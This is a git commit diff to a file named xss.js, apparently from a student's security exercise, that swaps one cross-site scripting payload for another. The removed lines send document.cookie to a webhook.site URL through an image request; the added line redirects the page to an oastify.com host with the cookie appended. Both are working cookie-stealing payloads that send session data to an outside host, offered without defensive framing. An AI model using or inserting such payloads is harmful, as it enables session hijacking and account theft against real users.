9de7b8d626c63942af1c13d800beb3de6753f899
Mathis <mathis.onillon@epitech.eu>
2025-05-15 22:18:42 +0200

    refactor: revert to direct document.location assignment for cookie retrieval

--- xss.js
+++ xss.js
@@ -1,3 +1,1 @@
-// Using image to avoid CORS preflight
-const img = new Image();
-img.src = 'https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972/XSS/grabber.php?c=' + encodeURIComponent(document.cookie);
+document.location='http://7go0aqfh0duyb0j74s00hwdtuk0bo4ct.oastify.com/XSS/grabber.php?c='+document.cookie
